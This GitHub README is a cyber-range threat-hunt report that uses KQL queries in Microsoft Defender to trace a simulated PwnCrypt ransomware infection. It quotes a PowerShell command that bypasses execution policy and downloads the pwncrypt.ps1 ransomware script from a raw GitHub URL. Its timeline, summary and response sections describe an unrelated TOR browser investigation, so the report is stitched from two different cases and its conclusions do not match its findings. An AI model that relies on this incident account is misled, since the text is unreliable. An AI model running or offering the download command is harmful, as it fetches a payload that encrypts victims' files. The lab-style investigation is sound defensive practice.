
<p align="center">
  <img src="https://github.com/user-attachments/assets/b7afca87-3ed2-42cd-b8a1-0a0e21d19d15"
</p>

# Threat Hunt Report:  Zero-Day-Ransomware-PwnCrypt-Outbreak
- [Scenario Creation](https://github.com/JordanDanielWest/threat-hunting-scenario-tor/blob/main/threat-hunting-scenario-tor-event-creation.md)

## Platforms and Languages Leveraged
- Windows 10 Virtual Machines (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- Powershell

##  Scenario

A new ransomware strain named PwnCrypt has been reported in the news, leveraging a PowerShell-based payload to encrypt files on infected systems. The payload, using AES-256 encryption, targets specific directories such as the C:\Users\Public\Desktop, encrypting files and prepending a .pwncrypt extension to the original extension. For example, hello.txt becomes hello.pwncrypt.txt after being targeted with the ransomware. The CISO is concerned with the new ransomware strain being spread to the corporate network and wishes to investigate.

### High-Level Ransomware IoC Discovery Plan

- **Check `DeviceFileEvents`** for any files with `pwncrypt`.
- **Check `DeviceProcessEvents`** to determine delivery method.

---

## Steps Taken

### 1. Searched the `DeviceFileEvents` Table

I ran a query in DeviceFileEvents that revealed a file named `pwncrypt.ps1` created at `2025-04-17T20:14:28.4324263Z` confirming that the Pwncrypt Ransomware has been run and infected our corporate network.

Folder Path: `C:\ProgramData\pwncrypt.ps1`

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "edr-machine"
| where FileName has_any ("pwncrypt")
| sort by Timestamp desc
```
![image](https://github.com/user-attachments/assets/03e9c92a-5852-466c-9c6e-19d11492f91d)

---
### 2. Searched the `DeviceFileEvents` Table

I ran a query that revealed several files created with the “pwncrypt” extension.
- Files: `1308_EmployeeRecords_pwncrypt.csv`, `6664_ProjectList_pwncrypt.csv`, `2669_CompanyFinancials_pwncrypt.csv`.


**Query used to locate events:**
```kql
DeviceFileEvents
| where DeviceName == "edr-machine"
| where FileName has_any ("pwncrypt")
| sort by Timestamp desc
| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessParentFileName, InitiatingProcessCommandLine
| where ActionType  == "FileCreated"
| where Timestamp >= datetime(2025-04-17T20:14:28.4324263Z)
```
![image](https://github.com/user-attachments/assets/2542925f-a21c-4154-806a-1e40613a3390)
![image](https://github.com/user-attachments/assets/236da8c4-50dd-41db-8d8e-6647e9c8c868)

### 3. Searched the `DeviceProcessEvents` Table

I next checked the DeviceProcessEvents table in order to determine how the files were encrypted. I found evidence of manual `cmd.exe` of powershell running 
- Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run:
  - `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
    - The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `),
    - then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`)
    - and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
**Query used to locate event:**

```kql

DeviceProcessEvents
| where DeviceName == "edr-machine"
| where FileName endswith "powershell.exe"
| where ProcessCommandLine contains "pwncrypt.ps1"
| project Timestamp, ProcessCommandLine, InitiatingProcessCommandLine, InitiatingProcessAccountName
| sort by Timestamp desc
```
![image](https://github.com/user-attachments/assets/e50340a2-bed0-42bf-95b4-581d12ea59a4)

---
### 4: Identifying the Executing Account

The initiating process account for the execution of `pwncrypt.ps1` was `SYSTEM`, indicating the script was run with elevated privileges. This suggests it may have been executed via a scheduled task or system-level process. Due to current access limitations, I forwarded my findings to a senior analyst with the appropriate credentials to investigate further.

---

## Chronological Event Timeline 

### 1. File Download - TOR Installer

- **Timestamp:** `2025-04-14T21:01:37.1940431Z`
- **Event:** The user "ds9-cisco" downloaded a file named `tor-browser-windows-x86_64-portable-14.0.9.exe` to the Downloads folder.
- **Action:** File download detected.
- **File Path:** `C:\Users\DS9-CISCO\Downloads\tor-browser-windows-x86_64-portable-14.0.9.exe`

### 2. Process Execution - TOR Browser Installation

- **Timestamp:** `2025-04-14T21:04:58.6035812Z`
- **Event:** The user "ds9-cisco" executed the file `tor-browser-windows-x86_64-portable-14.0.9.exe` in silent mode, initiating a background installation of the TOR Browser.
- **Action:** Process creation detected.
- **Command:** `tor-browser-windows-x86_64-portable-14.0.9.exe /S`
- **File Path:** `C:\Users\DS9-CISCO\Downloads\tor-browser-windows-x86_64-portable-14.0.9.exe`

### 3. Process Execution - TOR Browser Launch

- **Timestamp:** `2025-04-14T21:05:30.6659937Z`
- **Event:** User "ds9-cisco" opened the TOR browser. Subsequent processes associated with TOR browser, such as `firefox.exe` and `tor.exe`, were also created, indicating that the browser launched successfully.
- **Action:** Process creation of TOR browser-related executables detected.
- **File Path:** `C:\Users\DS9-CISCO\Desktop\Tor Browser\Browser\TorBrowser\Tor\tor.exe`

### 4. Network Connection - TOR Network

- **Timestamp:** `2025-04-14T21:05:38.1904337Z`
- **Event:** A network connection to IP `194.147.140.107` on port `443` by user "ds9-cisco" was established using `tor.exe`, confirming TOR browser network activity.
- **Action:** Connection success.
- **Process:** `tor.exe`
- **File Path:** `c:\users\ds9-cisco\desktop\tor browser\browser\torbrowser\tor\tor.exe`

### 5. Additional Network Connections - TOR Browser Activity

- **Timestamps:**
  - `2025-04-14T21:05:40.7830533Z` - Connected to `116.12.180.234` on port `443`.
  - `2025-04-14T21:06:46.2718388Z` - Local connection to `194.147.140.107` on port `443`.
- **Event:** Additional TOR network connections were established, indicating ongoing activity by user "ds9-cisco" through the TOR browser.
- **Action:** Multiple successful connections detected.

### 6. File Creation - TOR Shopping List

- **Timestamp:** `2025-04-14T21:18:38.2736577Z`
- **Event:** The user "ds9-cisco" created a file named `tor-shopping-list.txt` on the desktop, potentially indicating a list or notes related to their TOR browser activities.
- **Action:** File creation detected.
- **File Path:** `C:\Users\DS9-CISCO\Desktop\tor-shopping-list.txt`

---

## Summary

The user "ds9-cisco" on the "edr-machine" device initiated and completed the installation of the TOR browser. They proceeded to launch the browser, establish connections within the TOR network, and created various files related to TOR on their desktop, including a file named `tor-shopping-list.txt`. This sequence of activities indicates that the user actively installed, configured, and used the TOR browser, likely for anonymous browsing purposes, with possible documentation in the form of the "shopping list" file.

---

## Response Taken

TOR usage was confirmed on the endpoint `edr-machine` by the user `ds9-cisco`. The device was isolated, and the user's direct manager was notified.

---# threat-hunting-scenario-tor
